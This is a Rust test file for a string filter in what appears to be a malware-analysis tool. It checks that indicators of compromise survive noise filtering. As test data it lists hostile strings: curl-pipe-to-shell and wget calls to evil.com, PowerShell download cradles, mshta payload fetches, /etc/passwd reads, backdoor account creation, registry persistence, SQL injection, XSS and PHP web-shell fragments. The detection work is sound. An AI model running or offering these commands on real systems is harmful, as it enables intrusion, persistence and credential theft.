    #[test]
    fn test_is_garbage_hex_id_runs() {
        // UUIDs / Mythic payload_uuid
        assert!(!is_garbage("88a39a12-f279-4bb2-b102-1ee1157ad859"));
        assert!(!is_garbage("550e8400-e29b-41d4-a716-446655440000"));
        // Cryptographic hashes
        assert!(!is_garbage("d41d8cd98f00b204e9800998ecf8427e")); // MD5
        assert!(!is_garbage("da39a3ee5e6b4b0d3255bfef95601890afd80709")); // SHA1
        // MAC address
        assert!(!is_garbage("aa:bb:cc:dd:ee:ff"));
        assert!(!is_garbage("00:11:22:33:44:55"));
        // IPv6 fragment / full
        assert!(!is_garbage("2001:db8::1"));
        assert!(!is_garbage("fe80::1ff:fe23:4567:890a"));
        // GNU/ELF BuildID (hex blob)
        assert!(!is_garbage("26c9f26735a5f88a34ea361101b66971e5d74a29"));
        // Pure punctuation / too short / degenerate runs must NOT match
        assert!(!is_hex_id_run("--------", 8));
        assert!(!is_hex_id_run("::::::::", 8));
        assert!(!is_hex_id_run("12-34", 5));
        assert!(!is_hex_id_run("aaaaaaaa", 8)); // single distinct hex char
        assert!(!is_hex_id_run("12121212", 8)); // two distinct hex chars
        assert!(!is_hex_id_run("aa:bb:cc", 8)); // three distinct hex chars
    }

    #[test]
    fn test_is_garbage_token_id_runs() {
        // Opaque API tokens / b64-shaped IDs (length ≥ 12, base64 alphabet)
        assert!(!is_garbage("AKIAIOSFODNN7EXAMPLE")); // AWS access key id shape
        assert!(!is_garbage("ghp_AbCd1234EfGh5678IjKl"));
        assert!(!is_garbage("se3A/A1YKZQ630wtjjvw")); // Mythic PSK fragment
        assert!(!is_garbage("1z2y3x4w5v6u")); // chaotic but diverse alphanumeric
        // Too short / not enough diversity / wrong alphabet
        assert!(!is_token_id_run("AKIA", 4));
        assert!(!is_token_id_run("aaaaaaaaaaaa", 12)); // 1 distinct
        assert!(!is_token_id_run("ababababababab", 14)); // 2 distinct
        assert!(!is_token_id_run("hello world!", 12)); // space + !
    }

    #[test]
    fn test_is_garbage_jpeg_metadata() {
        // JPEG/image metadata strings should NOT be garbage
        assert!(!is_garbage("JFIF"));
        assert!(!is_garbage("Photoshop 3.0"));
        assert!(!is_garbage("8BIM")); // Photoshop resource marker
        assert!(!is_garbage("Exif"));
        assert!(!is_garbage("cph/3c13276u.tif"));
        assert!(!is_garbage("1998:12:15 13:03:34"));
        assert!(!is_garbage("Library of Congress"));
        // JPEG quantization table character sequence
        assert!(!is_garbage("%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz"));
    }

    #[test]
    fn test_is_garbage_misaligned_go_reads() {
        // Misaligned Go data patterns should be garbage
        assert!(is_garbage("asL "));
        assert!(is_garbage("``L "));
        assert!(is_garbage("dL "));
        assert!(is_garbage("7aL "));
        assert!(is_garbage("`L "));
        assert!(is_garbage("D`L  "));
        assert!(is_garbage("~dL  "));
        assert!(is_garbage("#uL  "));
        assert!(is_garbage("gkL     @M"));
    }

    #[test]
    fn test_is_garbage_short_binary_patterns() {
        // Short strings that look like misaligned binary data
        assert!(is_garbage("PuO#"));
        assert!(is_garbage("P9O"));
        assert!(is_garbage("8ZAj"));
        assert!(is_garbage("pIo2")); // mixed case + digit = garbage
        // Note: "PIO2" (3 upper + 1 digit) is now accepted as it matches
        // common patterns like "UTF8", "SHA1", "3DES" (file sigs, algorithms)
        assert!(!is_garbage("PIO2"));
        assert!(is_garbage("@E?"));
        assert!(is_garbage("P$O"));
        assert!(is_garbage("0Y/("));
        assert!(is_garbage("UoV#"));
        assert!(is_garbage("1j2`1r2l1128"));
        // JPEG/binary compressed data patterns
        assert!(is_garbage("Gi4r"));
        assert!(is_garbage("Uim0"));
        assert!(is_garbage("Ilu4")); // mixed case with digit
        // `cwZd` (lowercase + one uppercase + lowercase) used to be filtered
        // here, but it shares its shape with valid 4-char camelCase like
        // `iPad`, `hWnd`, `lpSz`. The looser short-camelCase rule now keeps
        // both — too brittle to distinguish without a whitelist.
        assert!(!is_garbage("cwZd"));
        // Consistent case alphanumeric patterns are accepted if they look like real identifiers
        assert!(!is_garbage("9N2A")); // all uppercase + digits, leading 9 = valid
        assert!(is_garbage("0YI0")); // digits at BOTH ends = garbage
        assert!(is_garbage("0GZF")); // single leading 0 = garbage
        assert!(is_garbage("1ABC")); // single leading 1 = garbage
        assert!(is_garbage("8oz1")); // mixed case (upper and lower) = garbage
        // `gnzUrs` (one upper mid-string) used to be filtered here, but the
        // same shape covers real camelCase identifiers like `getTime` and
        // `setLine`. The looser identifier-shape rule now keeps both.
        assert!(!is_garbage("gnzUrs"));
        assert!(!is_garbage("getTime"));
        // Note: "3OEP" looks like "8BIM" (digit + uppercase), can't distinguish without whitelist
        // Short strings with internal spaces
        assert!(is_garbage("5c 9"));
        assert!(is_garbage("VW N"));
        // But all-uppercase, all-lowercase, or all-numeric are OK
        assert!(!is_garbage("PFO"));
        assert!(!is_garbage("API"));
        assert!(!is_garbage("foo"));
        assert!(!is_garbage("1234"));
    }

    #[test]
    fn test_is_garbage_short_nonalpha() {
        // Short strings with mostly non-alphanumeric
        assert!(is_garbage("@#$%"));
        assert!(is_garbage("!!!"));
        assert!(is_garbage("   "));
        assert!(is_garbage(""));
    }

    #[test]
    fn test_is_garbage_repeated_chars() {
        // Single repeated characters
        assert!(is_garbage("aaaa"));
        assert!(is_garbage("...."));
        assert!(is_garbage("----"));
    }

    #[test]
    fn test_is_garbage_unicode_endings() {
        // Short strings with non-ASCII unicode at the end
        assert!(is_garbage("333333ӿ"));
        assert!(is_garbage("abcӿ"));
    }

    #[test]
    fn test_is_garbage_control_chars() {
        // Strings with control characters
        assert!(is_garbage("ab\x00cd"));
        assert!(is_garbage("\x01\x02\x03"));
    }

    #[test]
    fn test_is_garbage_single_char() {
        assert!(is_garbage("a"));
        assert!(is_garbage("X"));
        assert!(is_garbage("1"));
    }

    #[test]
    fn test_is_garbage_alternating_pattern() {
        // Alternating digit/non-hex-letter chaos with no other signal
        assert!(is_garbage("1z2y3x4w5v"));
        // Pure-hex run of the same shape is kept — could be a short
        // hash fragment, build ID, or other identifier (see
        // is_hex_id_run / test_is_garbage_hex_id_runs).
        assert!(!is_garbage("1a2b3c4d5e"));
    }

    #[test]
    fn test_is_garbage_low_alphanum_ratio() {
        // Less than 30% alphanumeric for strings > 6 chars
        assert!(is_garbage("....!!!!"));
    }

    #[test]
    fn test_is_garbage_unbalanced_parens() {
        assert!(is_garbage("ab(cd"));
        assert!(is_garbage("ab[cd"));
    }

    #[test]
    fn test_is_garbage_single_quote() {
        assert!(is_garbage("ab'cd"));
    }

    #[test]
    fn test_is_garbage_trailing_newline_ok() {
        // Trailing newline should not trigger control char detection
        assert!(!is_garbage("hello world\n"));
    }

    #[test]
    fn test_is_garbage_pascal_case_identifiers() {
        // PascalCase / camelCase symbol names with frequent Upper↔Lower
        // transitions are valid identifiers and must not be flagged as chaotic.
        // Regression: pre-fix, the binary at SHA
        // 515638dc...e7.exe (a .NET PE with `CallByName` at offset 0x46fd) was
        // missing this symbol because the chaos detector saw avg run length
        // 1.67 over 10 chars and bailed.
        for s in [
            "CallByName",
            "FooBarBaz",
            "PtrToThis",
            "SetIterKey",
            "FileSizeLow",
            "LowDateTime",
            "MaxSockAddr",
            "ReturnIsPtr",
            "GetHashCode",
            "AddRange",
            "ToString",
        ] {
            assert!(!is_garbage(s), "{s:?} is a valid PascalCase identifier");
        }
    }

    #[test]
    fn test_is_garbage_alternating_case_letters_kept() {
        // Long pure-ASCII letter strings — even with frequent case alternation —
        // are likely meaningful (identifiers, obfuscated text, words).
        for s in ["AbCdEfGh", "PaSsWoRd", "TheQuickBrownFox", "AaBbCcDdEe"] {
            assert!(!is_garbage(s), "{s:?} is a long letter string");
        }
    }

    #[test]
    fn test_is_garbage_leading_tab_trimmed() {
        // A leading tab on an otherwise valid identifier must not poison
        // the control-character check. Real Go pclntab entries surface
        // identifiers prefixed with a `\t` byte. (Leading literal spaces
        // are still treated as garbage by the short-string heuristic at
        // `is_fast_path_garbage` — that's separate and intentional.)
        assert!(!is_garbage("\tPtrToThis"));
        assert!(!is_garbage("\tCallByName"));
        assert!(!is_garbage("\tFieldByName"));
    }

    #[test]
    fn test_is_garbage_camel_case_garbage_still_rejected() {
        // Alternation alone is not enough — without any ≥2-char lowercase run
        // and at <7 chars, mixed-case strings should still be considered garbage.
        assert!(is_garbage("AaBbCc"));
    }

    #[test]
    fn test_is_garbage_crypto_algorithm_names() {
        // Crypto / hash / type names with digits used to be killed by the
        // MIXED_CASE_DIGIT range filter (5–10 chars + upper + lower + digit).
        // The looser identifier-shape rule keeps them.
        for s in [
            "MD5Hash",
            "SHA256Init",
            "Curve25519",
            "Ed25519",
            "Argon2",
            "ToInt32",
            "Int64",
            "BCrypt",
        ] {
            assert!(!is_garbage(s), "{s:?} is a valid identifier with digits");
        }
    }

    #[test]
    fn test_is_garbage_file_globs() {
        // File-glob patterns are high-value malware indicators and must
        // survive the short-string noise-punctuation filter.
        for s in ["*.exe", "*.dll", "*.bin", "*.tmp", "*.log", "*.so"] {
            assert!(!is_garbage(s), "{s:?} is a valid file glob");
        }
        // Sanity: the bare extension form was already accepted.
        for s in [".exe", ".dll", ".so", "exe", "dll"] {
            assert!(!is_garbage(s));
        }
    }

    #[test]
    fn test_is_garbage_four_char_camelcase_kept() {
        // 4-char camelCase: brand names, Hungarian notation, abbreviated
        // identifiers — high signal for security analysts (`hWnd` is a
        // ubiquitous Win32 type; `iPad`, `iMac` are Apple device IDs).
        for s in ["iPad", "iMac", "iPod", "hWnd", "lpSz", "dwId"] {
            assert!(!is_garbage(s), "{s:?} is a valid 4-char camelCase");
        }
    }

    #[test]
    fn test_is_garbage_short_function_calls_kept() {
        // `Run()`, `F(x)`, `fn()` — short function-call shapes are
        // meaningful code fragments, not noise.
        for s in ["Run()", "fn()", "F(x)", "Init()", "Stop()"] {
            assert!(!is_garbage(s), "{s:?} is a valid function call");
        }
    }

    #[test]
    fn test_is_garbage_multi_word_fragments_kept() {
        // Multi-word fragments from disassembly output, formatted logs, etc.
        // The space-separated structure is meaningful even when individual
        // tokens look like noise (single-letter, all-caps, etc.).
        for s in [
            "MOV EAX, 0",
            "JMP +5",
            "SUB ESP, 8",
            "PUSH EAX",
            "LEA RAX, [RBX]",
        ] {
            assert!(!is_garbage(s), "{s:?} is a valid asm fragment");
        }
    }

    #[test]
    fn test_is_garbage_multi_word_noise_still_rejected() {
        // A single space inside otherwise-noisy bytes shouldn't save them.
        // The exemption requires <=1 noise-punct char and all-ASCII.
        assert!(is_garbage("ZFI7% eE;*\\Y"));
        assert!(is_garbage("`C dJe`eN{Û"));
    }

    #[test]
    fn test_is_garbage_short_camelcase_kept() {
        // 5+ char identifier-shaped names are kept — covers `iPad`-style
        // abbreviated identifiers, Hungarian notation like `hModule`, and
        // brand-shaped strings like `iOSv2`.
        for s in ["myVal", "getId", "iOSv2", "setLen"] {
            assert!(!is_garbage(s));
        }
        // 4-char binary noise with a digit or uppercase prefix is still
        // rejected. (`cwZd` was previously here but is now kept because
        // it has the same lowercase-first camelCase shape as `iPad`.)
        for s in ["Ilu4", "Uim0", "Gi4r", "8oz1"] {
            assert!(is_garbage(s));
        }
    }

    #[test]
    fn test_is_garbage_short_strings_with_dots() {
        // Short strings with dots should not be automatically marked as garbage
        // These are common in filenames and section names
        assert!(!is_garbage("d.exe"), "d.exe should not be garbage");
        assert!(!is_garbage(".blah"), ".blah should not be garbage");
        assert!(!is_garbage("a.out"), "a.out should not be garbage");
        assert!(!is_garbage("lib.so"), "lib.so should not be garbage");

        // Section names specifically (starts with dot)
        assert!(!is_garbage(".text"), ".text should not be garbage");
        assert!(!is_garbage(".data"), ".data should not be garbage");
        assert!(!is_garbage(".bss"), ".bss should not be garbage");
    }

    #[test]
    fn test_is_garbage_base64_strings() {
        // Base64 strings should NOT be garbage
        assert!(!is_garbage("VGhpcyBpcyBhIHNlY3JldCBtZXNzYWdl"));
        assert!(!is_garbage("SGVsbG8gV29ybGQh"));
        assert!(!is_garbage("YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo="));
    }

    #[test]
    fn test_is_garbage_obfuscated_javascript() {
        // Obfuscated JavaScript with hex identifiers should NOT be garbage
        // This is common in malware and should be preserved for analysis
        let test_cases = vec![
            ("const _0x1c1000=_0x230d;", "simple const assignment"),
            (
                "const _0x1c1000=_0x230d;function _0x230d(_0x996a22,_0x589a56){const _0x11053a=_0x1105();return _0x230d=function(_0x2",
                "full obfuscated code",
            ),
            (
                "function _0x230d(_0x996a22,_0x589a56)",
                "function declaration",
            ),
            ("const _0x1c1000=_0x230d", "const without semicolon"),
            ("_0x230d(_0x996a22,_0x589a56)", "function call"),
            ("return _0x230d", "return statement"),
            ("var _0x4a5b=['base64','encode','decode']", "var with array"),
            ("if(_0x1a2b3c===_0x4d5e6f)", "if statement"),
            ("_0x123abc[_0x456def(0x0)]", "array access"),
        ];

        for (s, desc) in test_cases {
            let result = is_garbage(s);
            assert!(
                !result,
                "Obfuscated JavaScript should NOT be garbage: {} - got is_garbage={}",
                desc, result
            );
        }
    }

    #[test]
    fn test_is_garbage_shell_shebangs_and_options() {
        // Shebang lines and shell command options should NOT be garbage
        assert!(!is_garbage("#!/bin/sh -eux -o p"));
        assert!(!is_garbage("#!/bin/bash"));
        assert!(!is_garbage("#!/usr/bin/env python3"));
        assert!(!is_garbage("sh -c 'command'"));
        assert!(!is_garbage("bash -eux"));
        assert!(!is_garbage("/bin/sh -e"));
    }

    #[test]
    fn test_is_garbage_obfuscated_python() {
        // Obfuscated Python with mangled identifiers should NOT be garbage
        assert!(!is_garbage("def llIIlIlllllIIlllII(lllIllllIIIllIllII):"));
        assert!(!is_garbage(
            "lllllIIIIlllllIlII=IIllIlI.IllIllIllIllllIIlIIlIllIl();llIIIIIllllIllIlII=lilIIlI.IllIllIllIllllIIlIIlIllIl();llIlIIIIIIIIllIIlI=lIllIlIlIIIlIIIlII.IllIIlIIlllIIIIlIlIIllIII(lllllIIIIlllllIlII,llIIIIIllllIllIlII)"
        ));
        assert!(!is_garbage(
            "return llIIIIIlIllIllIlIl(lllIllllIIIllIllII.IllllIIllllIIIIIIlIIlIIII(llIlIIIIIIIIllIIlI)).IlIlIlIlIIIIlIllIllllllII()"
        ));
        assert!(!is_garbage(
            "lIlIlIlIIIlIllllll(IIlIlIIIlIIIIlIIIl(IllIllIlIIIlllllII(llIIlIlllllIIlllII(lIlllllIl)),llIIlIlllllIIlllII(lIIIIIlI))(lIllIlIlIIIlIIIlII.IlIIIllIIIIlllIIIlllIlIll(lIlIIIlIlIIIlI.replace"
        ));
    }

    #[test]
    fn test_is_garbage_malware_iocs() {
        // IOCs commonly found in malware should NOT be garbage

        // MAC addresses
        assert!(!is_garbage("00:1A:2B:3C:4D:5E"), "MAC address colon format");
        assert!(!is_garbage("00-1A-2B-3C-4D-5E"), "MAC address dash format");
        assert!(!is_garbage("001A.2B3C.4D5E"), "MAC address Cisco format");

        // IPv6 addresses
        assert!(
            !is_garbage("2001:0db8:85a3:0000:0000:8a2e:0370:7334"),
            "IPv6 full"
        );
        assert!(
            !is_garbage("2001:db8:85a3::8a2e:370:7334"),
            "IPv6 compressed"
        );
        assert!(!is_garbage("::1"), "IPv6 loopback");
        assert!(!is_garbage("fe80::1"), "IPv6 link-local");
        assert!(!is_garbage("2001:db8::192.0.2.1"), "IPv6 with IPv4");

        // Crypto keys and hashes (RC4, AES, etc.)
        assert!(!is_garbage("5f4dcc3b5aa765d61d8327deb882cf99"), "MD5 hash");
        assert!(
            !is_garbage("2fd4e1c67a2d28fced849ee1bb76e7391b93eb12"),
            "SHA1 hash"
        );
        assert!(
            !is_garbage("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"),
            "SHA256 hash"
        );
        assert!(!is_garbage("DEADBEEF1234567890ABCDEF"), "Hex key");

        // Comma-delimited locale/language values
        assert!(!is_garbage("en_US,en,en_GB,fr_FR,de_DE"), "Locale list");
        assert!(!is_garbage("en-US,zh-CN,ja-JP,ko-KR"), "Language codes");
        assert!(
            !is_garbage("UTF-8,ISO-8859-1,ASCII,UTF-16"),
            "Encoding list"
        );

        // Obfuscated code patterns - C
        assert!(
            !is_garbage("char *p=((char*)0x41414141);"),
            "C pointer obfuscation"
        );
        assert!(!is_garbage("__attribute__((constructor))"), "C attribute");
        assert!(!is_garbage("#define XOR(a,b) ((a)^(b))"), "C macro");

        // Obfuscated code patterns - PHP
        assert!(
            !is_garbage("eval(base64_decode('SGVsbG8='));"),
            "PHP eval base64"
        );
        assert!(!is_garbage("${'GLOBALS'}['_GET']"), "PHP dynamic globals");
        assert!(
            !is_garbage("${$_GET['x']}($_POST['y']);"),
            "PHP variable variables"
        );
        assert!(
            !is_garbage("preg_replace('/e/e','system($_GET[c])','');"),
            "PHP preg_replace /e"
        );

        // Obfuscated code patterns - Perl
        assert!(
            !is_garbage("eval(pack('H*','48656c6c6f'));"),
            "Perl eval pack"
        );
        assert!(!is_garbage("system($ARGV[0]);"), "Perl system call");
        assert!(!is_garbage("open(F,'|/bin/sh');"), "Perl pipe open");

        // Obfuscated code patterns - Shell
        assert!(
            !is_garbage("eval $(echo SGVsbG8K|base64 -d)"),
            "Shell eval base64"
        );
        assert!(
            !is_garbage("sh -c 'curl http://evil.com|sh'"),
            "Shell curl pipe"
        );
        assert!(
            !is_garbage("${IFS}cat${IFS}/etc/passwd"),
            "Shell IFS obfuscation"
        );

        // Network indicators
        assert!(!is_garbage("Host: evil.com:8080"), "HTTP host header");
        assert!(!is_garbage("User-Agent: Mozilla/5.0"), "HTTP user agent");
        assert!(
            !is_garbage("Content-Type: application/x-www-form-urlencoded"),
            "HTTP content type"
        );
    }

    #[test]
    fn test_is_garbage_non_ascii_strings() {
        // Strings with excessive non-ASCII characters should be garbage
        let test_cases = vec![
            ("/º ¸`¨wl½¶ zmNy", "Path with non-ASCII chars"),
            ("cyl}´á!Qñ#´{ûNy1", "Random with non-ASCII chars"),
            ("CMQpç+9¥g½Ñãiq¸¹:î¦»ölX²", "Long string with non-ASCII"),
            ("?ÔTlbxbµ¥äèêæ", "Short string with non-ASCII"),
            ("ÉBXAÕhDqÌuyóÉµ", "Mixed with non-ASCII"),
            ("ùÉÜÔrzAyÀµCLYìÐ", "Random non-ASCII"),
            ("ë9[R.-XK3`o3ú¼ÁOY", "Special chars with non-ASCII"),
            ("rL*>@«ßtS·` tNV°}*¸", "Symbols with non-ASCII"),
            ("Yapt3OJÃÚ'µ£¦¯È", "Mixed case with non-ASCII"),
            ("`C dJe`eN{Û", "Backtick with non-ASCII"),
        ];

        for (s, desc) in test_cases {
            if !is_garbage(s) {
                eprintln!(
                    "FAILED: {} - String: {:?}, len={}, chars={}",
                    desc,
                    s,
                    s.len(),
                    s.chars().count()
                );
            }
            assert!(is_garbage(s), "{}", desc);
        }
    }

    #[test]
    fn test_is_garbage_literal_escape_sequences() {
        // Strings with literal \x escape sequences (not in code context) are garbage
        assert!(
            is_garbage("RFXA-\\xU*^$U"),
            "Literal \\x escape outside code"
        );
        assert!(is_garbage("foo\\x41bar"), "Literal \\x in string");

        // But these should NOT be garbage (code context)
        assert!(
            !is_garbage("print \"\\x41\\x42\\x43\""),
            "Code with escape sequences"
        );
        assert!(
            !is_garbage("echo '\\x48\\x65\\x6c\\x6c\\x6f'"),
            "Shell with escapes"
        );
    }

    #[test]
    fn test_is_garbage_ransomware_and_ctf_iocs() {
        // IOCs commonly found in ransomware and CTF challenges should NOT be garbage

        // Cryptocurrency wallet addresses
        assert!(
            !is_garbage("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"),
            "Bitcoin address (legacy)"
        );
        assert!(
            !is_garbage("3J98t1WpEZ73CNmYviecrnyiWrnqRhWNLy"),
            "Bitcoin address (P2SH)"
        );
        assert!(
            !is_garbage("bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"),
            "Bitcoin address (bech32)"
        );
        assert!(
            !is_garbage("0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb"),
            "Ethereum address"
        );
        assert!(
            !is_garbage(
                "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A"
            ),
            "Monero address"
        );
        assert!(
            !is_garbage("LdP8Qox1VAhCzLJNqrqPRHWXpnRAjRUa4L"),
            "Litecoin address"
        );
        assert!(
            !is_garbage("DH5yaieqoZN36fDVciNyRueRGvGLR3mr7L"),
            "Dogecoin address"
        );

        // Cryptocurrency mining pools and stratum URLs
        assert!(!is_garbage("pool.minexmr.com:4444"), "Monero mining pool");
        assert!(!is_garbage("xmr-eu1.nanopool.org:14444"), "Nanopool XMR");
        assert!(
            !is_garbage("eth-us-east1.nanopool.org:9999"),
            "Nanopool ETH"
        );
        assert!(
            !is_garbage("stratum+tcp://pool.supportxmr.com:3333"),
            "Stratum URL"
        );
        assert!(
            !is_garbage("stratum+ssl://xmr.pool.minergate.com:45700"),
            "Stratum SSL"
        );

        // Cryptocurrency miner software names and commands
        assert!(!is_garbage("xmrig"), "XMRig miner");
        assert!(!is_garbage("xmr-stak"), "XMR-Stak miner");
        assert!(!is_garbage("cpuminer-multi"), "CPU miner");
        assert!(!is_garbage("ccminer"), "CUDA miner");
        assert!(!is_garbage("ethminer"), "Ethereum miner");
        assert!(!is_garbage("PhoenixMiner"), "Phoenix miner");
        assert!(!is_garbage("t-rex"), "T-Rex miner");
        assert!(!is_garbage("--donate-level=1"), "Miner donate flag");
        assert!(
            !is_garbage("-o pool.minexmr.com:4444 -u"),
            "Miner command line"
        );
        assert!(!is_garbage("--algo=cryptonight"), "Mining algorithm");
        assert!(!is_garbage("--cuda-devices=0,1"), "GPU device selection");

        // Tor/Onion URLs (common in ransomware)
        assert!(!is_garbage("http://thehiddenwiki.onion"), "Onion URL HTTP");
        assert!(
            !is_garbage("https://3g2upl4pq6kufc4m.onion"),
            "Onion URL DuckDuckGo"
        );
        assert!(!is_garbage("ransomware2x4ytmz.onion"), "Onion domain only");

        // CTF flag formats
        assert!(!is_garbage("CTF{th1s_1s_4_fl4g}"), "CTF flag format");
        assert!(
            !is_garbage("flag{base64_encoded_secret}"),
            "flag{{}} format"
        );
        assert!(
            !is_garbage("picoCTF{b1n4ry_3xpl01t4t10n}"),
            "picoCTF format"
        );
        assert!(!is_garbage("HTB{h4ck_th3_b0x}"), "HackTheBox format");
        assert!(!is_garbage("FLAG{SQL_1nj3ct10n_pwn3d}"), "FLAG{{}} format");

        // Email addresses (used in ransomware contact)
        assert!(!is_garbage("decrypt@protonmail.com"), "Ransomware email");
        assert!(!is_garbage("recover.files@tutanota.com"), "Recovery email");
        assert!(!is_garbage("unlock_data@cock.li"), "Contact email");

        // Ransomware file extensions
        assert!(!is_garbage(".locked"), "Locked extension");
        assert!(!is_garbage(".encrypted"), "Encrypted extension");
        assert!(!is_garbage(".crypted"), "Crypted extension");
        assert!(!is_garbage(".wannacry"), "WannaCry extension");
        assert!(!is_garbage(".ryuk"), "Ryuk extension");
        assert!(!is_garbage(".locky"), "Locky extension");

        // Mutex/synchronization names (often weird strings)
        assert!(
            !is_garbage("Global\\MsWinZonesCacheCounterMutexA"),
            "Windows mutex"
        );
        assert!(
            !is_garbage("{8F6F0AC4-B9A1-45fd-A8CF-72997C3991B}"),
            "GUID mutex"
        );

        // Windows registry paths
        assert!(
            !is_garbage("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
            "Registry run key"
        );
        assert!(
            !is_garbage("HKCU\\Software\\Classes\\exefile\\shell\\open\\command"),
            "Registry exefile"
        );

        // SQL injection payloads (CTF/pentesting)
        assert!(!is_garbage("' OR '1'='1"), "SQL injection basic");
        assert!(!is_garbage("admin'--"), "SQL comment injection");
        assert!(
            !is_garbage("1' UNION SELECT NULL,NULL,NULL--"),
            "SQL union injection"
        );

        // XSS payloads
        assert!(!is_garbage("<script>alert(1)</script>"), "XSS basic");
        assert!(!is_garbage("<img src=x onerror=alert(1)>"), "XSS img tag");
        assert!(
            !is_garbage("javascript:alert(document.cookie)"),
            "XSS javascript protocol"
        );

        // Command injection patterns
        assert!(
            !is_garbage("; cat /etc/passwd"),
            "Command injection semicolon"
        );
        assert!(!is_garbage("| whoami"), "Command injection pipe");
        assert!(!is_garbage("`id`"), "Command injection backticks");
        assert!(
            !is_garbage("$(wget http://evil.com/shell.sh)"),
            "Command injection wget"
        );

        // Persistence mechanisms
        assert!(
            !is_garbage("schtasks /create /tn \"WindowsUpdate\" /tr"),
            "Scheduled task"
        );
        assert!(
            !is_garbage("net user hacker password123 /add"),
            "User creation"
        );
        assert!(
            !is_garbage("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
            "Registry persistence"
        );

        // Common malware/CTF tools signatures
        assert!(!is_garbage("powershell -enc"), "PowerShell encoded");
        assert!(
            !is_garbage("IEX(New-Object Net.WebClient).DownloadString"),
            "PowerShell download"
        );
        assert!(
            !is_garbage("certutil -urlcache -split -f"),
            "Certutil download"
        );
        assert!(
            !is_garbage("mshta http://evil.com/payload.hta"),
            "Mshta execution"
        );

        // JWT tokens (common in web CTFs)
        assert!(
            !is_garbage(
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
            ),
            "JWT token"
        );

        // RSA/PEM keys (truncated for test)
        assert!(!is_garbage("-----BEGIN PUBLIC KEY-----"), "PEM header");
        assert!(!is_garbage("-----END PRIVATE KEY-----"), "PEM footer");
        assert!(
            !is_garbage("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA"),
            "RSA key data"
        );

        // Ransom note patterns
        assert!(
            !is_garbage("YOUR FILES HAVE BEEN ENCRYPTED"),
            "Ransom message"
        );
        assert!(!is_garbage("Send $500 in Bitcoin to"), "Ransom demand");
        assert!(
            !is_garbage("DECRYPT-INSTRUCTIONS.txt"),
            "Ransom note filename"
        );
        assert!(!is_garbage("HOW-TO-DECRYPT.html"), "Decrypt instructions");

        // LDAP/AD paths
        assert!(!is_garbage("LDAP://CN=Users,DC=domain,DC=com"), "LDAP path");
        assert!(
            !is_garbage("CN=Administrator,CN=Users,DC=corp,DC=local"),
            "AD distinguished name"
        );

        // API keys/secrets patterns (should preserve structure even if fake)
        assert!(!is_garbage("AKIA0123456789ABCDEF"), "AWS access key format");
        assert!(
            !is_garbage("ghp_0123456789abcdefghijklmnopqrstuv"),
            "GitHub token format"
        );
        assert!(
            !is_garbage("sk_live_0123456789abcdefghijklmn"),
            "Stripe secret key"
        );
    }

    #[test]
    fn test_is_garbage_xor_malware_samples() {
        // Real garbage strings from XOR-decoded malware (brew_agent sample)
        // These have chaotic character class alternation and should be filtered
        // Note: Some strings with specific patterns (e.g., short with limited special chars)
        // may not be caught by all heuristics, but the majority should be filtered
        let garbage_strings = vec![
            "v*\\^R--E:y4)@O",
            "ZFI7% eE;*\\Y",
            "Z(9uE(/S_B>7/c",
            "#LUU2!FN}v.VDH!#T:y40]P\"L,JSy',E[H\"5/c",
            "#L_G90_<\"J8KFy!!SCy>+FH}v.LXJ",
            "\\?UuC%3YeO9,[<\"J8KFy!!SCy' ]Z",
            "H>@uO*)T:y40]P\"L,JSy4%R\\I%(/c",
            "G$M*y'5RVy2$\\E\"Y(KLI6- eE\"7Cc",
            "P_T1*]Q}v.LXJ",
            "F?T*y'5RVy2$\\E\"Z(MEV0@",
            "IC#*_H}v.LXJ",
            "\\?UuU()SNy17JY\"H!U*y!8IN&",
            "[(\\uG(, eC/,[<\"O.UEU!@",
            "Z(9u@'/PC@>)J<\"O+U_U,@",
            "\\>Q*y\"'ENUW",
            "\\A21\\<\"O!VIMD",
            "\\J8&D<\"O\"IOHD",
            "F.R*y\"/P_HW",
            "[(\\*y\"2EUV2+/c",
            "\\R2)C<\"O9\\FJ+@",
            "@9\\*y#%T_H!Ep[",
            "]C# AJ}v*\\^N+3TTG: /c",
            "^OR,/SNH6(J<\"N(MZQ1)D:y0",
        ];

        for s in &garbage_strings {
            assert!(
                is_garbage(s),
                "XOR garbage string should be filtered: {:?}",
                s
            );
        }
    }

    // ===== Telegram bot token predicate =====

    #[test]
    fn test_is_telegram_bot_token_positive() {
        // DPRK Teams (2026.04) sample.
        let t = "8520232238:AAF6xeNiv-OKpAPrnRmv7AsjmJAmkRjf0I4";
        assert!(is_telegram_bot_token(t, t.len()));

        // Canonical bot token from Telegram docs.
        let t = "110201543:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw";
        assert!(is_telegram_bot_token(t, t.len()));

        // Underscores in body.
        let t = "6789012345:ABC_def123GHI_jklMNO-pqrSTU_vwxYZ01";
        assert!(is_telegram_bot_token(t, t.len()));

        // Whole token kept out of the chaos filter.
        assert!(!is_garbage(
            "8520232238:AAF6xeNiv-OKpAPrnRmv7AsjmJAmkRjf0I4"
        ));
    }

    #[test]
    fn test_is_telegram_bot_token_negative() {
        // No colon.
        let t = "8520232238AAF6xeNivOKpAPrnRmv7AsjmJAmkRjf0I4";
        assert!(!is_telegram_bot_token(t, t.len()));

        // bot_id too short (7 digits).
        let t = "1234567:AAF6xeNiv-OKpAPrnRmv7AsjmJAmkRjf0I4";
        assert!(!is_telegram_bot_token(t, t.len()));

        // bot_id contains letters.
        let t = "bot1234567:AAF6xeNiv-OKpAPrnRmv7AsjmJAmkRjf0I4";
        assert!(!is_telegram_bot_token(t, t.len()));

        // body too short.
